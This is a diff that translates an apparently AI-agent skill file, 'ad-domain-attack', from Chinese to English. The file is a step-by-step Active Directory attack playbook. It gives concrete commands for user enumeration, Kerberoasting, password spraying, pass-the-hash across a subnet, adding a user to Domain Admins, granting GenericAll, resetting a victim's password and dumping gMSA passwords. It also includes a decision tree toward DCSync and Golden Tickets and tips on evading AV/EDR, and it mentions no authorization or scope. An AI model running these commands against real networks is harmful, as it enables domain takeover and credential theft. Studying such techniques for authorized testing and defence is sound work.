@@ -1,128 +1,130 @@
 ---
 name: ad-domain-attack
-description: "Active Directory 域环境攻击全链路。当目标主机在域环境中（systeminfo 显示 Domain 非 WORKGROUP）、发现 88/389/636 端口、或获取到域用户凭据时使用。覆盖域信息收集、用户枚举、Kerberoasting、AS-REP Roasting、委派攻击、ACL 滥用、DCSync、Golden/Silver Ticket"
+description: "Full attack chain for Active Directory domain environments. Use when the target host is domain-joined (systeminfo shows Domain not WORKGROUP), ports 88/389/636 are exposed, or domain user credentials are obtained. Covers domain information gathering, user enumeration, Kerberoasting, AS-REP Roasting, delegation attacks, ACL abuse, DCSync, and Golden/Silver Tickets"
+zh-signals: "覆盖 Active Directory 域环境攻击全链路，从信息收集、Kerberoasting 到委派攻击、ACL 滥用与 DCSync 提权。信号:AD域攻击,Kerberoasting,委派攻击,DCSync,域控"
+when-to-use: "Use when the target host is domain-joined, ports 88/389/636 are exposed, or domain user credentials are obtained and you need full AD attack paths."
 metadata:
-  tags: "ad,domain,kerberos,kerberoasting,asrep,delegation,dcsync,golden ticket,acl,域,域控,横向移动,ntlm,bloodhound,zerologon,CVE-2020-1472,netlogon"
+  tags: "ad,domain,kerberos,kerberoasting,asrep,delegation,dcsync,golden ticket,acl,domain-controller,lateral-movement,ntlm,bloodhound,zerologon,CVE-2020-1472,netlogon"
   category: "lateral"
   mitre_attack: "T1558.003,T1558.004,T1003.006,T1550.002,T1550.003,T1098,T1484"
 ---
 
-# AD 域攻击方法论
+# AD Domain Attack Methodology
 
-拿下域控 = 控制整个网络。
+Owning the domain controller = controlling the entire network.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 需要域侦察环境搭建与初始枚举 → [references/ad-recon-setup.md](references/ad-recon-setup.md)
-- 需要认证后深度枚举方法 → [references/authenticated-enum.md](references/authenticated-enum.md)
-- 需要密码喷洒、AS-REP Roasting、Kerberoasting 详细命令 → [references/credential-attacks.md](references/credential-attacks.md)
-- 需要委派攻击(RBCD)、ACL 滥用、DCSync、持久化 → [references/domain-escalation.md](references/domain-escalation.md)
-- → [references/zerologon-attack.md](references/zerologon-attack.md) — CVE-2020-1472 ZeroLogon 攻击与恢复
+- Domain recon environment setup and initial enumeration → [references/ad-recon-setup.md](references/ad-recon-setup.md)
+- Deep enumeration methods after authentication → [references/authenticated-enum.md](references/authenticated-enum.md)
+- Detailed commands for password spraying, AS-REP Roasting, Kerberoasting → [references/credential-attacks.md](references/credential-attacks.md)
+- Delegation attacks (RBCD), ACL abuse, DCSync, persistence → [references/domain-escalation.md](references/domain-escalation.md)
+- → [references/zerologon-attack.md](references/zerologon-attack.md) — the CVE-2020-1472 ZeroLogon attack and remediation
 
 ---
 
-## Phase 1: 域环境确认与信息收集
+## Phase 1: Domain Environment Confirmation and Information Gathering
 
-### 1.1 确认域环境
+### 1.1 Confirm the domain environment
 ```bash
 systeminfo | findstr /i "domain"       # Windows
 nltest /dclist:DOMAIN_NAME
 nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN  # Linux
 ```
-域控 IP 通常就是 DNS 服务器（`ipconfig /all` 中的 DNS Server）。
+The domain controller IP is usually the DNS server (the DNS Server entry in `ipconfig /all`).
 
-### 1.2 域枚举（无需凭据）
+### 1.2 Domain enumeration (no credentials required)
 ```bash
 kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
-netexec ldap DC_IP -u '' -p '' --users   # LDAP 匿名绑定
+netexec ldap DC_IP -u '' -p '' --users   # LDAP anonymous bind
 ```
 
-### 1.3 域深度枚举（需要域用户凭据）
+### 1.3 Deep domain enumeration (domain user credentials required)
 ```bash
 netexec ldap DC_IP -u USER -p PASS --users
-net accounts /domain    # 密码策略（锁定阈值！）
-impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP   # SPN 枚举
+net accounts /domain    # password policy (lockout threshold!)
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP   # SPN enumeration
 bloodhound-python -d DOMAIN -u USER -p PASS -dc DC_IP -c all
 ```
-BloodHound 能自动发现攻击路径，是域渗透最强大的工具。
+BloodHound automatically discovers attack paths and is the most powerful tool for domain penetration.
 
-## Phase 2: 攻击决策树
+## Phase 2: Attack Decision Tree
 
 ```
-拥有的凭据？
-├─ 无凭据 → AS-REP Roasting（无需预认证的用户）→ [references/credential-attacks.md](references/credential-attacks.md)
-├─ 任意域用户 → Kerberoasting（SPN 服务账户）→ [references/credential-attacks.md](references/credential-attacks.md)
-│             → 密码喷洒（先查锁定策略！）→ [references/credential-attacks.md](references/credential-attacks.md)
-│             → BloodHound 找攻击路径
-├─ 本地管理员 → SAM dump → PTH 横向 → 凭据复用
-├─ 域管权限 → DCSync 提取所有哈希 → [references/domain-escalation.md](references/domain-escalation.md)
-└─ 发现委派/ACL 路径 → 委派攻击/ACL 滥用 → [references/domain-escalation.md](references/domain-escalation.md)
+Which credentials do you have?
+├─ No credentials → AS-REP Roasting (users without pre-authentication) → [references/credential-attacks.md](references/credential-attacks.md)
+├─ Any domain user → Kerberoasting (SPN service accounts) → [references/credential-attacks.md](references/credential-attacks.md)
+│             → password spraying (check the lockout policy first!) → [references/credential-attacks.md](references/credential-attacks.md)
+│             → BloodHound to find attack paths
+├─ Local administrator → SAM dump → PTH lateral movement → credential reuse
+├─ Domain Admin rights → DCSync to extract all hashes → [references/domain-escalation.md](references/domain-escalation.md)
+└─ Delegation/ACL path found → delegation attack/ACL abuse → [references/domain-escalation.md](references/domain-escalation.md)
 ```
 
-### 凭据复用速查
+### Credential Reuse Quick Reference
 ```bash
 netexec smb 10.0.0.0/24 -u USER -p PASS --continue-on-success
 netexec smb 10.0.0.0/24 -u admin -H NTLM_HASH   # PTH
 ```
 
-## 工具速查
-| 场景 | 推荐工具 |
+## Tool Quick Reference
+| Scenario | Recommended tool |
 |------|----------|
-| 域枚举 | BloodHound, netexec |
-| 票据攻击 | impacket 套件 |
-| 密码破解 | hashcat |
-| 漏洞利用 | certipy (ADCS), zerologon 脚本 |
-| NTLM 中继 | ntlmrelayx + Responder |
-| 证书攻击 | certipy (ESC1-ESC11) |
-## Password Spray 安全策略
-- 检查域密码策略：Lockout duration（锁定时长/冷却时间）
-- 避免账户锁定影响可用性
-- observation window（观察窗口）：了解计数器重置时间
+| Domain enumeration | BloodHound, netexec |
+| Ticket attacks | the impacket suite |
+| Password cracking | hashcat |
+| Vulnerability exploitation | certipy (ADCS), zerologon scripts |
+| NTLM relaying | ntlmrelayx + Responder |
+| Certificate attacks | certipy (ESC1-ESC11) |
+## Password Spray Safety Policy
+- Check the domain password policy: Lockout duration (lockout period/cool-down time)
+- Avoid account lockout impacting availability
+- observation window: understand when the counter resets
 
-## 工具替代与规避
-- SharpHound 可能被拦截（杀软/EDR），需要替代方案
-- LDAP 查询可远程执行：无需上传工具、不接触目标文件系统
+## Tool Alternatives and Evasion
+- SharpHound may be blocked (AV/EDR), so alternatives are needed
+- LDAP queries can run remotely: no tool upload, no contact with the target file system
 
-## 补充工具
+## Supplementary Tools
 
-### bloodyAD — AD LDAP 操作
+### bloodyAD — AD LDAP operations
 ```bash
-# 添加用户到组
+# Add a user to a group
 bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add groupMember "Domain Admins" "TARGET_USER"
-# 修改 ACL（添加 GenericAll）
+# Modify ACL (add GenericAll)
 bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add genericAll "OU=xxx,DC=dom,DC=local" TARGET_USER
-# 查询可写对象
+# Query writable objects
 bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP get writable
-# 修改密码
+# Change a password
 bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP set password TARGET_USER "NewP@ss123"
 ```
 
-### ldeep — LDAP 深度枚举
+### ldeep — deep LDAP enumeration
 ```bash
-# 连接并枚举
+# Connect and enumerate
 ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP all
-# 枚举委派配置
+# Enumerate delegation configurations
 ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP delegations
-# 枚举 SPN
+# Enumerate SPNs
 ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP spns
-# 枚举 ASREPRoast 用户
+# Enumerate ASREPRoast users
 ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP asreproast
-# 枚举信任关系
+# Enumerate trust relationships
 ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP trusts
 ```
 
-### enum4linux-ng — SMB/RPC 枚举
+### enum4linux-ng — SMB/RPC enumeration
 ```bash
-# 完整枚举（用户、组、共享、策略、RID）
+# Full enumeration (users, groups, shares, policies, RID)
 enum4linux-ng -A TARGET_IP
-# 认证枚举
+# Authenticated enumeration
 enum4linux-ng -A TARGET_IP -u USER -p PASS
-# 仅用户枚举
+# Users only
 enum4linux-ng -U TARGET_IP -u USER -p PASS
 ```
 
-### gMSADumper — gMSA 密码提取
+### gMSADumper — gMSA password extraction
 ```bash
-# 导出 gMSA 账户密码
+# Export gMSA account passwords
 python3 /pentest/gMSADumper/gMSADumper.py -d DOMAIN -u USER -p PASS -l DC_IP
 ```
